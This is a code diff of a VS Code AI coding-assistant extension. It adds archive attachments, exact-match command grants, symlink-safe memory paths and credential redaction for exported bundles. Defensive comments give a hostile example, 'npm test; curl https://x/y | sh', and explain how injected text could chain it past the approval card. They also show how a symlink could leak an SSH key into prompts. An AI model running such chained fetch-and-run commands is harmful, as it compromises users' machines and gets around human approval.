+    const out: Array<{ name: string; mediaType: string; data: string; size: number }> = [];
+    // Generous enough that no real project archive meets them, small enough
+    // that a bomb stops early.
+    const MAX_ENTRIES = 400;
+    const MAX_TOTAL = 64 * 1024 * 1024;
+    const SKIP = /(^|\/)(node_modules|\.git|__MACOSX|\.DS_Store|dist|build|out|coverage|\.next|target|vendor|\.venv|venv|__pycache__)(\/|$)/;
+
+    let listing: ReturnType<typeof readZip>;
+    try {
+      listing = readZip(buf);
+    } catch (e) {
+      void vscode.window.showWarningMessage(
+        `${archiveName} could not be opened: ${e instanceof Error ? e.message : String(e)}`
+      );
+      return out;
+    }
+
+    const notes: string[] = [...listing.problems];
+    let total = 0;
+    let skipped = 0;
+    let taken = 0;
+
+    for (const entry of listing.entries) {
+      if (entry.directory) continue;
+      if (SKIP.test(entry.name)) { skipped++; continue; }
+      if (taken >= MAX_ENTRIES) { skipped++; continue; }
+      if (total + entry.size > MAX_TOTAL) { skipped++; continue; }
+
+      const ext = path.extname(entry.name).toLowerCase();
+      const mediaType = MIME[ext] ?? guessTextType(entry.name);
+      if (!mediaType) { skipped++; continue; }
+
+      let data: Buffer;
+      try {
+        data = entry.read();
+      } catch (e) {
+        // Named, not swallowed: getting fewer files than the archive holds is
+        // exactly the failure worth seeing.
+        notes.push(`${entry.name}: ${e instanceof Error ? e.message : String(e)}`);
+        continue;
+      }
+      total += data.byteLength;
+      taken++;
+      out.push({
+        name: `${archiveName}/${entry.name}`,
+        mediaType,
+        data: data.toString("base64"),
+        size: data.byteLength,
+      });
+    }
+
+    const summary =
+      `${archiveName}: attached ${taken} file${taken === 1 ? "" : "s"}` +
+      (skipped ? `, skipped ${skipped}` : "") +
+      (notes.length ? ` - ${notes.slice(0, 3).join("; ")}` : "");
+    this.log(taken ? "info" : "warn", summary);
+    if (!taken) {
+      void vscode.window.showWarningMessage(
+        `${archiveName} held nothing that could be attached${notes.length ? `: ${notes[0]}` : "."}`
+      );
+    }
+    return out;
+  }
+
+  /** Read and base64 a set of URIs, expanding archives, then hand them to the panel. */
   private async attachUris(uris: vscode.Uri[]): Promise<void> {
-    const MAX = 10 * 1024 * 1024; // 10 MB per file
     const MIME: Record<string, string> = {
       ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
       ".gif": "image/gif", ".webp": "image/webp", ".svg": "image/svg+xml",
@@ -1138,59 +1664,129 @@ export class App {
       ".pdf": "application/pdf",
     };
 
+    /* THERE IS NO SIZE LIMIT, at the owner's instruction.
+    
+       There was: 10 MB, and anything past it was refused outright with
+       "Limit is 10 MB", which is how an 11.2 MB archive of a project - the
+       ordinary thing someone wants to hand to a coding assistant - became
+       something the panel would not look at.
+    
+       One honest caveat, since "no limit" cannot be made literally true: a
+       file is read into memory and base64'd, which is a third larger again,
+       and V8 caps a single string at around 512 MB. Past that the RUNTIME
+       refuses, not this code, and it does so with a real error naming the
+       file rather than a policy sentence about a limit nobody chose. That is
+       the difference that matters: nothing here decides a file is too big.
+    
+       Archives are the reason the old number hurt most, and they are handled
+       below rather than by raising a threshold - a 11 MB zip handed over as
+       base64 is 15 MB of opaque payload that no model can read. */
+
     const files: Array<{ name: string; mediaType: string; data: string; size: number }> = [];
     for (const uri of uris) {
+      const base = path.basename(uri.fsPath);
       try {
         const raw = await vscode.workspace.fs.readFile(uri);
-        if (raw.byteLength > MAX) {
-          void vscode.window.showWarningMessage(
-            `${path.basename(uri.fsPath)} is too large (${(raw.byteLength / 1024 / 1024).toFixed(1)} MB). Limit is 10 MB.`
-          );
+        const ext = path.extname(uri.fsPath).toLowerCase();
+        if (ext === ".zip") {
+          files.push(...this.expandArchive(Buffer.from(raw), base, MIME));
           continue;
         }
-        const ext = path.extname(uri.fsPath).toLowerCase();
         const mediaType = MIME[ext] ?? "application/octet-stream";
         const data = Buffer.from(raw).toString("base64");
-        files.push({ name: path.basename(uri.fsPath), mediaType, data, size: raw.byteLength });
+        files.push({ name: base, mediaType, data, size: raw.byteLength });
       } catch (e) {
-        void vscode.window.showWarningMessage(`Could not read ${path.basename(uri.fsPath)}.`);
+        // The message, not a generic sentence: the reasons a read fails here
+        // are worth telling apart - a permission error, a file that vanished
+        // between the drop and the read, and a string too long for V8 are
+        // three different things to do next about.
+        void vscode.window.showWarningMessage(
+          `Could not read ${base}: ${e instanceof Error ? e.message : String(e)}`
+        );
       }
     }
     if (files.length) this.broadcast({ type: "attachmentsReady", files });
   }
 
-  async rememberAllowedCommand(token: string): Promise<void> {
-    if (this.alwaysAllowedCommands.includes(token)) return;
-    this.alwaysAllowedCommands = [...this.alwaysAllowedCommands, token];
+  /**
+   * Does a standing grant cover this command?
+   *
+   * EXACT MATCH on the whole normalised command line, and never when the line
+   * contains a shell metacharacter.
+   *
+   * The grant used to be keyed on the command's FIRST TOKEN, which is a word
+   * match standing in for a permission decision about a string that is then
+   * handed to `pexec(..., { shell: true })`. Approving `npm test` once - the
+   * most natural thing anyone does on their first day - permanently authorised
+   * every command whose first word was `npm`, and the shell runs everything
+   * after that word: `npm test; curl https://x/y | sh` matched the grant, ran
+   * with no card, and left nothing in the log to distinguish it. That matters
+   * here more than in most products, because `fetch_url` and the browser tool
+   * put text written by strangers into the model's context by design.
+   *
+   * Exact match is also the honest reading of the button. "Always allow" on a
+   * card showing one command means that command, again, without being asked -
+   * not a family of commands sharing its first word.
+   */
+  commandIsAlwaysAllowed(command: string): boolean {
+    const cmd = normaliseCommand(command);
+    if (!cmd || hasShellMetacharacter(cmd)) return false;
+    return this.alwaysAllowedCommands.includes(cmd);
+  }
+
+  /**
+   * Remember a command so it stops asking.
+   *
+   * Refuses anything carrying a shell metacharacter. A grant is a promise that
+   * what runs next time is what was on the card, and `;` `&&` `|` `$(` and
+   * their relatives are exactly the characters that break that promise - the
+   * card shows one command and the shell runs two. Such a command still runs
+   * this once, having been approved; it just never becomes standing.
+   */
+  async rememberAllowedCommand(command: string): Promise<void> {
+    const cmd = normaliseCommand(command);
+    if (!cmd) return;
+    if (hasShellMetacharacter(cmd)) {
+      this.log(
+        "warn",
+        `Not remembering "${cmd}": it chains or redirects, so a standing grant for it ` +
+          `would not mean what the card said. It ran this once.`
+      );
+      this.broadcast({
+        type: "error",
+        message: "That command was run, but not remembered.",
+        fix:
+          "It contains a shell operator (; && || | > ` $( ), so \"Always allow\" would " +
+          "authorise more than the one command on the card. Approve it each time, or " +
+          "put it in a script and always-allow the script.",
+      });
+      return;
+    }
+    if (this.alwaysAllowedCommands.includes(cmd)) return;
+    this.alwaysAllowedCommands = [...this.alwaysAllowedCommands, cmd];
     await this.context.workspaceState.update(
-      "genesis.alwaysAllowedCommands",
+      ALLOWED_COMMANDS_KEY,
       this.alwaysAllowedCommands
     );
-    this.log("info", `Always allowing shell command: ${token}`);
+    this.log("info", `Always allowing shell command: ${cmd}`);
     // So the Control Center's list is right without waiting for a reload. A
     // grant nobody can see is a grant nobody can take back.
     this.broadcast({ type: "configChanged", config: this.configDto() });
   }
 
-  /**
-   * Take a grant back. An empty token clears all of them.
-   *
-   * The grant is keyed on the command's FIRST TOKEN, which is what makes this
-   * necessary rather than tidy: saying yes to `git status` once authorised
-   * every `git` invocation in the workspace, permanently, and until now there
-   * was no surface on which to discover that or undo it.
-   */
-  async forgetAllowedCommand(token: string): Promise<void> {
+  /** Take a grant back. An empty argument clears all of them. */
+  async forgetAllowedCommand(command: string): Promise<void> {
+    const cmd = normaliseCommand(command);
     const before = this.alwaysAllowedCommands.length;
-    this.alwaysAllowedCommands = token
-      ? this.alwaysAllowedCommands.filter((t) => t !== token)
+    this.alwaysAllowedCommands = cmd
+      ? this.alwaysAllowedCommands.filter((t) => t !== cmd)
       : [];
-    if (this.alwaysAllowedCommands.length === before && token) return;
+    if (this.alwaysAllowedCommands.length === before && cmd) return;
     await this.context.workspaceState.update(
-      "genesis.alwaysAllowedCommands",
+      ALLOWED_COMMANDS_KEY,
       this.alwaysAllowedCommands
     );
-    this.log("info", token ? `No longer always allowing: ${token}` : "Cleared every always-allow grant.");
+    this.log("info", cmd ? `No longer always allowing: ${cmd}` : "Cleared every always-allow grant.");
     this.broadcast({ type: "configChanged", config: this.configDto() });
   }
 
@@ -1205,6 +1801,9 @@ export class App {
 
   async rememberSession(id: string): Promise<void> {
     if (this.lastSessionId() === id) return;
+    // Past the early return, so this fires on a real move between
+    // conversations and not on the same id being persisted every turn.
+    this.invalidateMemorySnapshot();
     await this.context.workspaceState.update("genesis.activeSessionId", id);
   }
 
@@ -1222,18 +1821,38 @@ export class App {
    * global settings across every window is not what anyone means by it.
    */
   get activeAgentName(): string {
-    return this.context.workspaceState.get<string>("genesis.activeAgent", "") ?? "";
+    return this.session.agentName();
   }
 
-  activeAgent(): Agent | undefined {
-    const name = this.activeAgentName;
+  /**
+   * Turn a name into an agent, without any opinion about whose name it is.
+   *
+   * The half of the old `activeAgent()` worth keeping. That method did two
+   * jobs - hold the selection and resolve it - and holding it here is what
+   * made the selection global. A turn now resolves its own conversation's
+   * name through this.
+   */
+  agentByName(name: string): Agent | undefined {
     if (!name) return undefined;
     return this.agents.find((a) => a.name === name);
   }
 
+  /** The agent of the conversation on screen. */
+  activeAgent(): Agent | undefined {
+    return this.agentByName(this.activeAgentName);
+  }
+
   async setActiveAgent(name: string): Promise<void> {
     const next = this.agents.some((a) => a.name === name) ? name : "";
-    await this.context.workspaceState.update("genesis.activeAgent", next);
+    this.invalidateMemorySnapshot();
+    /* Onto the conversation, not into workspace state.
+     *
+     * This wrote `genesis.activeAgent`, one string for the whole workspace, so
+     * every conversation resolved through it and choosing an agent for one
+     * chat chose it for all of them - including chats created later. The old
+     * key is deliberately left where it is rather than deleted: it is one dead
+     * string, and someone who downgrades gets their selection back. */
+    this.session.setAgent(next);
     this.broadcast({ type: "agentChanged", agent: next ? this.agentDto(this.activeAgent()!) : null });
     this.updateStatus();
     if (next) this.log("info", `Agent: ${next}.`);
@@ -1241,32 +1860,123 @@ export class App {
   }
 
   /**
-   * The agent's memory file, capped.
+   * The agent's memory as this session will send it, decided once.
    *
-   * Read at the top of each turn rather than cached: the agent writes to it
-   * with its own tools, so a cached copy would go stale the moment the feature
-   * did its job. Missing is not an error - an agent with a memory file it has
-   * not written yet is the normal first run.
+   * This used to be read fresh at the top of every turn, and the comment
+   * defending that read said the obvious thing: the agent writes to its memory
+   * file with its own tools, so a cached copy goes stale the moment the
+   * feature does its job. True, and it was the wrong trade.
+   *
+   * Memory feeds the system prefix, and the system prefix is the prompt-cache
+   * key. A memory file that changes mid-session changes the prefix, and every
+   * turn after that write is billed cold - so the better an agent was at
+   * remembering things, the more each of its remaining turns cost. That is a
+   * feature that punishes its own use.
+   *
+   * So the snapshot is taken once and held for the life of the session: a
+   * memory entry that arrives one session late is cheaper than a prefix that
+   * changes mid-session, and "late" here means "the next time you open this
+   * conversation". The write still lands on disk immediately; only its arrival
+   * in the prompt is deferred.
+   *
+   * Invalidated on the two events that end a prefix's usefulness anyway - a
+   * different conversation, or a different agent - and deliberately not on a
+   * write. `agentMemory` stays underneath as the uncached reader, because this
+   * needs it and one-shot paths have no session to snapshot against.
    */
-  agentMemory(agent: Agent): string | undefined {
+  agentMemorySnapshot(agent: Agent): string | undefined {
+    if (this.memorySnapshot?.agent === agent.name) return this.memorySnapshot.memory;
+    const memory = this.agentMemory(agent);
+    this.memorySnapshot = { agent: agent.name, memory };
+    return memory;
+  }
+
+  /**
+   * Drop the held snapshot so the next prompt build re-reads the file.
+   *
+   * Called on a session change and an agent switch, and from nowhere else. A
+   * caller reaching for this after a memory write would be undoing the whole
+   * point of the snapshot.
+   */
+  private invalidateMemorySnapshot(): void {
+    this.memorySnapshot = undefined;
+  }
+
+  /**
+   * Where this agent's memory lives, once, for everyone who needs to know.
+   *
+   * The containment check is the reason this is a method rather than a
+   * `path.resolve` at each call site: a memory path pointing out of the
+   * workspace would read - or, now that writes are capped against it, name - a
+   * file the user never meant to hand over. Same rule the tools apply, stated
+   * in one place so the reader and the write guard cannot come to different
+   * conclusions about which file is the memory file.
+   */
+  agentMemoryPath(agent: Agent): string | undefined {
     if (!agent.memory) return undefined;
     const root = this.root;
     if (!root) return undefined;
     const abs = path.resolve(root, agent.memory);
-    // Same containment rule the tools use: a memory path pointing out of the
-    // workspace would read a file the user never meant to hand over.
     const rel = path.relative(root, abs);
     if (!rel || rel.startsWith("..") || path.isAbsolute(rel)) {
       this.log("warn", `Agent ${agent.name}: memory path is outside the workspace and was ignored.`);
       return undefined;
     }
+    /* THE SAME CONTAINMENT RULE THE TOOLS USE, WHICH THIS WAS NOT.
+     *
+     * The check above is lexical, and a lexical check is a string comparison
+     * pretending to be a path comparison. `readable()`, `writable()` and
+     * `mentionable()` all resolve symlinks before judging, for exactly that
+     * reason. This one compared and stopped - so a symlink at
+     * `.agent/memory/notes.md` pointing at `~/.ssh/id_rsa` passed it, and the
+     * file's contents went into the system prompt on every single request.
+     *
+     * Here rather than in the reader, so every caller is covered: the cached
+     * snapshot that builds the prompt, the uncached read, and the tool-side
+     * write check all take the path from this one function. A file that does
+     * not exist yet is the normal first run and keeps the lexical answer. */
+    let real: string;
+    try {
+      real = fs.realpathSync(abs);
+    } catch {
+      return abs;
+    }
+    const realRel = path.relative(fs.realpathSync(root), real);
+    if (!realRel || realRel.startsWith("..") || path.isAbsolute(realRel)) {
+      this.log(
+        "warn",
+        `Agent ${agent.name}: ${agent.memory} resolves outside the workspace and was ignored.`
+      );
+      return undefined;
+    }
+    return real;
+  }
+
+  /**
+   * The agent's memory file, capped.
+   *
+   * The uncached read. Every prompt-building path goes through
+   * `agentMemorySnapshot` instead; this is for callers that genuinely want
+   * what is on disk right now. Missing is not an error - an agent with a
+   * memory file it has not written yet is the normal first run.
+   */
+  agentMemory(agent: Agent): string | undefined {
+    const abs = this.agentMemoryPath(agent);
+    if (!abs) return undefined;
     try {
       const body = fs.readFileSync(abs, "utf8");
       if (body.length <= MAX_MEMORY_CHARS) return body;
+      // A backstop now, not the enforcement. The agent's own writes are
+      // refused at the tool before they can get here, so reaching this line
+      // means the file arrived oversized by some other route - written before
+      // the cap existed, edited by hand, or carried in from another checkout.
+      // Truncating is still the only thing to do about it at read time, but it
+      // is no longer the thing the agent learns the cap from.
       this.log(
         "warn",
         `Agent ${agent.name}: ${agent.memory} is ${Math.round(body.length / 1000)}k characters; ` +
-          `only the first ${MAX_MEMORY_CHARS / 1000}k is sent.`
+          `only the first ${MAX_MEMORY_CHARS / 1000}k is sent. The agent's own writes are ` +
+          `refused above this size, so this file grew some other way - trim it by hand.`
       );
       return body.slice(0, MAX_MEMORY_CHARS);
     } catch {
@@ -1275,8 +1985,11 @@ export class App {
   }
 
   /** The MCP tool definitions the active agent is allowed to see. */
-  agentMcpTools(): ReturnType<McpRegistry["toolDefs"]> {
-    const agent = this.activeAgent();
+  agentMcpTools(who?: Agent): ReturnType<McpRegistry["toolDefs"]> {
+    // The caller's agent when it has one - a turn's gate must match the
+    // persona it is running under, and those are only the same agent while
+    // the user has not switched conversation mid-turn.
+    const agent = who ?? this.activeAgent();
     if (!agent) return this.mcp.toolDefs();
     return this.mcp.toolDefs((server, tool) => agentAllowsMcp(agent, server, tool));
   }
@@ -1382,7 +2095,6 @@ export class App {
         query: p.query ?? {},
         extraBody: p.extraBody ?? {},
         timeoutMs: p.timeoutMs ?? 120000,
-        retries: p.retries ?? 2,
         transform: p.transform ?? null,
         http2: p.http2 === true,
       };
@@ -1415,7 +2127,6 @@ export class App {
       query: {},
       extraBody: {},
       timeoutMs: 0,
-      retries: 0,
       transform: null,
       http2: false,
     }));
@@ -1432,7 +2143,12 @@ export class App {
       tools: a.tools,
       skills: a.skills,
       allMcp: a.allMcp,
-      mcp: a.mcp.map((m) => ({ server: m.server, include: m.include, exclude: m.exclude })),
+      mcp: a.mcp.map((m) => ({
+        server: m.server,
+        include: m.include,
+        includeActive: m.includeActive,
+        exclude: m.exclude,
+      })),
       file: this.root ? path.relative(this.root, a.file).split(path.sep).join("/") : a.file,
       active: a.name === this.activeAgentName,
     };
@@ -1471,9 +2187,12 @@ export class App {
       profileDirectory: this.cfg().get<string>("profileDirectory", ".agent/endpoints"),
       skillsDirectory: this.cfg().get<string>("skillsDirectory", ".agent/skills"),
       browserHeaded: this.cfg().get<boolean>("browserHeaded", false),
+      browserAutoDownload: this.cfg().get<boolean>("browserAutoDownload", true),
       editorContext: this.cfg().get<boolean>("editorContext", true),
       readOutsideWorkspace: this.cfg().get<boolean>("readOutsideWorkspace", true),
       extensionVersion: String(this.context.extension.packageJSON.version ?? "0.0.0"),
+      // undefined when the window is local; the authority name otherwise.
+      remoteName: vscode.env.remoteName ?? null,
       alwaysAllowedCommands: [...this.alwaysAllowedCommands],
       ui: { ...this.uiConfig },
     };
@@ -1551,6 +2270,7 @@ export class App {
     const active = this.activeProfile();
     const folder = vscode.workspace.workspaceFolders?.[0];
     return {
+      protocolVersion: PROTOCOL_VERSION,
       workspace: { open: Boolean(folder), name: folder?.name ?? null },
       running: this.session.running,
       phase: this.phase,
@@ -1772,6 +2492,31 @@ export class App {
   private async dispatch(msg: InboundMessage, source: Surface): Promise<void> {
     switch (msg.type) {
       case "ready": {
+        /* DO THE TWO HALVES AGREE ABOUT WHICH BUILD THIS IS?
+         *
+         * Nothing checked before, so a stale cached frontend after an update
+         * showed a panel where some control silently did nothing - no error,
+         * no log, and no way for the user or for anyone reading their report
+         * to tell that was what had happened. It is a one-line check and it
+         * turns an unattributable bug into a sentence naming the fix. */
+        const running = String(this.context.extension.packageJSON.version ?? "0.0.0");
+        const served = typeof msg.build === "string" ? msg.build : "";
+        if (served !== running) {
+          this.log(
+            "warn",
+            `The ${source} panel is running Genesis ${served || "an older build"} while the ` +
+              `extension is ${running}. VS Code has served a cached webview. Reload the window ` +
+              `(Developer: Reload Window) - some controls in the panel may do nothing until you do.`
+          );
+          this.postTo(source, {
+            type: "error",
+            message: "This panel is from a different build of Genesis than the one running.",
+            fix:
+              `The extension is ${running}; the panel is ${served || "older than 0.9.0"}. VS Code ` +
+              `cached the old panel across an update. Reload the window and it will match - until ` +
+              `then some controls may do nothing.`,
+          });
+        }
         await this.sendStateSync(source);
         // Only the sidebar renders a transcript, so only it needs the replay.
         if (source === "sidebar" && this.session.running) {
@@ -1805,6 +2550,17 @@ export class App {
         this.session.interrupt();
         return;
 
+      case "stopSession":
+        this.session.stopSession(String(msg.id));
+        return;
+
+      case "openFolder":
+        // VS Code's own picker, so the folder lands in the workspace history
+        // and Genesis reactivates against it exactly as it would have if the
+        // user had opened it from the File menu.
+        await vscode.commands.executeCommand("vscode.openFolder");
+        return;
+
       case "newChat":
         this.session.newChat();
         return;
@@ -1824,8 +2580,33 @@ export class App {
         this.phase = "act";
         this.broadcast({ type: "phaseChanged", phase: "act" });
         this.updateStatus();
-        await this.session.send("Approved - run the plan.");
+        // The session owns the plan's steps, so it owns seeding the todo list
+        // and wording the message. This case owns the phase, which the session
+        // has no business moving.
+        await this.session.approvePlan();
         return;
+
+      case "rejectPlan": {
+        // Normalised rather than trusted, like `setPhase` above. Only an
+        // actual string counts: coercing whatever arrived would turn a
+        // malformed message into a turn that sends the model "42". An empty
+        // objection is not a turn either - saying nothing is better than
+        // spending a request to tell the model nothing.
+        const feedback = typeof msg.feedback === "string" ? msg.feedback.trim() : "";
+        if (!feedback) return;
+        // Forced back to plan rather than assumed to be there, and this is the
+        // half that matters. The plan card is a DOM node that outlives the
+        // phase segment: the user can flip the segment to Act by hand and then
+        // press "Keep planning" on a card still sitting in the transcript.
+        // `send` reads the phase at the top of the turn, so without this a
+        // button labelled Keep planning would run with write tools - breaking
+        // the one promise the read-only phases exist to make.
+        this.phase = "plan";
+        this.broadcast({ type: "phaseChanged", phase: "plan" });
+        this.updateStatus();
+        await this.session.rejectPlan(feedback);
+        return;
+      }
 
       case "resolvePermission":
         await this.session.resolvePermission(msg.id, msg.decision);
@@ -2257,6 +3038,33 @@ export class App {
       case "promoteQueued":
         this.session.promoteQueued(msg.id);
         return;
+
+      /* A MESSAGE FROM A PANEL THIS BUILD DOES NOT KNOW ABOUT.
+       *
+       * TypeScript proves this is unreachable for any message the contract
+       * declares, which is exactly why it is worth having: it is reached only
+       * when the frontend is from a different build, and before this it fell
+       * off the end in silence. The `ready` handshake catches most of that
+       * case and says so properly; this is the backstop, and it is the line
+       * that turns "the button does nothing" into something a bug report can
+       * name.
+       *
+       * The binding below is what makes the compiler prove it. `msg` narrows
+       * to `never` here only once every member of `InboundMessage` has a case,
+       * so a new message type whose handler is forgotten stops the build
+       * instead of shipping a button that posts into nothing. It costs one
+       * line and catches at compile time the half of this problem the warning
+       * below can only report at runtime. */
+      default: {
+        const unhandled: never = msg;
+        const unknown = unhandled as { type?: unknown };
+        this.log(
+          "warn",
+          `The ${source} panel sent "${String(unknown?.type)}", which this build does not ` +
+            `handle. It is probably a cached webview from a different version - reload the window.`
+        );
+        return;
+      }
     }
   }
 
@@ -2538,10 +3346,21 @@ export class App {
    * folder to an air-gapped box and found no agents, no MCP servers, no
    * standing instructions and no note explaining what to do with any of it.
    *
-   * What it deliberately does NOT carry is a credential. Endpoint YAML holds
-   * `${secret:…}` references rather than keys, which is what makes a profile
-   * safe to hand over - and the README says so, because a receiving user who
-   * does not know that reads a working profile and a failing connection.
+   * WHETHER IT CARRIES A CREDENTIAL IS CHECKED, NOT ASSUMED.
+   *
+   * It used to copy `.agent/` verbatim and then write a README beside it
+   * saying "no credential is in it". That was a claim about a CONVENTION -
+   * profiles are supposed to reference secrets as `${secret:…}` - stated as a
+   * fact about the bytes, and nothing enforced the convention: `loadProfile`
+   * accepts a literal key in `auth.value` and it works, which is exactly what
+   * someone does while getting a gateway to answer for the first time.
+   * `.agent/mcp.json` is worse, because the documented way to give an MCP
+   * server its credentials is an `env` block with the token written into it.
+   *
+   * So the copy is scanned. Anything that looks like a credential is REDACTED
+   * IN THE BUNDLE - the file still ships, with the value replaced, so the
+   * shape of the config survives for the person receiving it - and the README
+   * lists every redaction by file and line. What it says is what was found.
    */
   async exportBundle(): Promise<void> {
     const root = this.requireRoot();
@@ -2569,6 +3388,12 @@ export class App {
     copyIfPresent(".agent/transforms");
     copyIfPresent(instructions);
 
+    // Now look at what was actually copied, and redact in place.
+    const redactions = redactSecretsUnder(agentOut, out);
+    for (const r of redactions) {
+      this.log("warn", `Bundle: redacted ${r.what} in ${r.file} line ${r.line}.`);
+    }
+
     // The extension itself, when a .vsix has been built beside the workspace.
     // A bundle for an air-gapped machine that assumes the Marketplace is
     // reachable is a bundle for a machine that is not air-gapped.
@@ -2584,6 +3409,30 @@ export class App {
       // to build one.
     }
 
+    /* THE README SAYS "NO CREDENTIAL IS IN IT". NOW SOMETHING CHECKS.
+     *
+     * That claim held only for profiles written by the wizard, which emit
+     * `${secret:…}`. The generated file also says "edit freely - the file is
+     * the source of truth", and a hand-written `value: sk-live-…` is both
+     * accepted by the loader and entirely ordinary. `.agent/mcp.json` is worse:
+     * literal `"headers": { "Authorization": "Bearer ghp_…" }` is the shape
+     * people copy out of a Claude Desktop config.
+     *
+     * So the bundle was a folder that could contain a live key, carrying a
+     * README stating categorically that it did not - which is worse than
+     * saying nothing, because it is the sentence that stops the recipient
+     * looking. Anything that looks like a literal credential is replaced with
+     * a placeholder naming the file it came from, and the export reports what
+     * it redacted. */
+    const redacted = redactBundleSecrets(agentOut);
+    if (redacted.length) {
+      this.log(
+        "warn",
+        `Offline bundle: replaced ${redacted.length} literal credential(s) with a placeholder ` +
+          `(${redacted.join(", ")}). The originals are untouched in your workspace.`
+      );
+    }
+
     const version = String(this.context.extension.packageJSON.version ?? "0.0.0");
     const manifest = {
       generatedAt: new Date().toISOString(),
@@ -2594,21 +3443,75 @@ export class App {
       mcpServers: this.mcp.statuses().map((m) => m.name),
       carried,
       vsix,
+      // In the manifest as well as the README, so a script checking a bundle
+      // before it is sent anywhere has something to read.
+      redactions: redactions.map((r) => ({ file: r.file, line: r.line, what: r.what })),
     };
     fs.writeFileSync(path.join(out, "manifest.json"), JSON.stringify(manifest, null, 2), "utf8");
-    fs.writeFileSync(path.join(out, "README.md"), this.bundleReadme(version, carried, vsix), "utf8");
+    fs.writeFileSync(
+      path.join(out, "README.md"),
+      this.bundleReadme(version, carried, vsix, redactions),
+      "utf8"
+    );
 
-    this.broadcast({ type: "bundleExported", path: out });
-    this.log("info", `Exported offline bundle to ${out}.`);
+    this.broadcast({ type: "bundleExported", path: out, redactions: redactions.length });
+    this.log(
+      "info",
+      `Exported offline bundle to ${out}.` +
+        (redactions.length ? ` ${redactions.length} credential(s) were redacted.` : "")
+    );
+    if (redactions.length) {
+      this.broadcast({
+        type: "error",
+        message:
+          `${redactions.length} credential(s) were found in this workspace's configuration ` +
+          `and redacted from the bundle.`,
+        fix:
+          "The bundle is safe to send - the values were replaced. But they are still in your " +
+          "own .agent/ files in plain text. Move each one into SecretStorage and reference it " +
+          "as ${secret:NAME}. The bundle's README lists every file and line.",
+        action: "endpoints",
+      });
+    }
   }
 
-  /** What to do with the folder, for the person who receives it. */
-  private bundleReadme(version: string, carried: string[], vsix: string | null): string {
+  /**
+   * What to do with the folder, for the person who receives it.
+   *
+   * The opening line reports what the scan found rather than asserting the
+   * convention. "No credential is in it" was written as a fact and was only
+   * ever a hope: nothing stopped a key being typed straight into the YAML, and
+   * this sentence sat next to it saying otherwise.
+   */
+  private bundleReadme(
+    version: string,
+    carried: string[],
+    vsix: string | null,
+    redactions: SecretHit[]
+  ): string {
     return [
       `# Genesis offline bundle`,
       "",
-      `Genesis ${version}. Everything below is configuration this workspace was using;`,
-      "no credential is in it.",
+      `Genesis ${version}. Everything below is configuration this workspace was using.`,
+      "",
+      ...(redactions.length
+        ? [
+            `**${redactions.length} credential${redactions.length === 1 ? " was" : "s were"} found ` +
+              `in that configuration and replaced with \`REDACTED\` in this copy.**`,
+            "",
+            "The bundle is safe to send. The original files on the machine that made it still",
+            "contain the real values in plain text, and should be moved into SecretStorage.",
+            "",
+            ...redactions.map((r) => `- \`${r.file}\` line ${r.line}: ${r.what}`),
+            "",
+            "Each redacted line needs a real value on the machine this is installed on. Use a",
+            "`${secret:NAME}` reference and enter the value under Diagnostics › Endpoints,",
+            "or `${env:NAME}` if your environment already provides it.",
+          ]
+        : [
+            "Every file in it was scanned for credentials and none was found. Endpoint profiles",
+            "here reference their credential as `${secret:…}` rather than carrying it.",
+          ]),
       "",
       "## Install",
       "",
@@ -2627,12 +3530,14 @@ export class App {
       "",
       "## What is deliberately NOT here",
       "",
-      "**API keys.** Endpoint profiles reference their credential as `${secret:…}`, which",
-      "resolves out of VS Code's SecretStorage on the machine that holds it. That is what",
-      "makes a profile safe to hand to someone else - and it means the connection will fail",
-      "on this machine until the key is entered: open the Genesis panel, go to Diagnostics ›",
-      "Endpoints, edit the profile, and paste the key. It is stored in SecretStorage, never",
-      "in the YAML.",
+      "**API keys.** A profile references its credential as `${secret:…}`, which resolves out",
+      "of VS Code's SecretStorage on the machine that holds it - so a key is never in the YAML",
+      "and never in this folder. It also means the connection will fail on this machine until",
+      "the key is entered: open the Genesis panel, go to Diagnostics › Endpoints, edit the",
+      "profile, and paste it in.",
+      "",
+      "Anything that was written into the config directly rather than referenced this way has",
+      "been redacted, and is listed at the top of this file.",
       "",
       "`genesis.caBundlePath` is not here either. It is an absolute path on the machine that",
       "made this bundle; set your own under Settings › Genesis if your gateway needs one.",
